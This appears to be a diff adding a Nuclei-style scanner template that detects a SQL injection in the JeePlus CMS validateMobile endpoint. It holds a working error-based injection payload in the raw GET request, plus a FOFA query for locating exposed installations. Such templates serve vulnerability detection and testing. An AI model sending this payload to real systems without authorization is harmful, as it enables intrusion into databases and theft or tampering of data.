@@ -1,0 +1,32 @@
+id: jeeplus-cms-resetpassword-sqli
+
+info:
+  name: JeePlus CMS - SQL Injection
+  author: WingBy_fkalis
+  severity: high
+  description: |
+    A SQL injection vulnerability exists in the JeePlus low-code development platform, allowing attackers to manipulate database queries.This can lead to unauthorized data access, modification, or potential compromise of the application.
+  reference:
+    - https://github.com/wy876/wiki/blob/main/JeePlus%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%BC%80%E5%8F%91%E5%B9%B3%E5%8F%B0/JeePlus%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%BC%80%E5%8F%91%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+    - http://www.cstam.oyg.cn/detail/429410
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="jeeplus.js" && body="/static/common/"
+  tags: jeeplus,jeecg,sqli,vuln,jeecgboot
+
+http:
+  - raw:
+      - |
+        GET /a/sys/user/validateMobile?&mobile=1%27+and+1%3D%28updatexml%281%2Cconcat%280x7e%2C%28select+md5%28123%29%29%2C0x7e%29%2C1%29%29+and+%271%27%3D%271 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: Keep-Alive
+    matchers:
+      - type: word
+        words:
+          - "SQL"
+          - "XPATH"
+          - "202cb962ac59075b964b07152d234b70"
+        condition: and
+# digest: 4a0a0047304502206768d55c57eb051dd7c3ac2465cf41ebbec2d28345c6991f9531fe7a8f30dfbd022100d1d66671a005999c3b2b93833f1c24177534406d565b36a42ceefb7ce426df17:922c64590222798bb761d5b6d8e72950
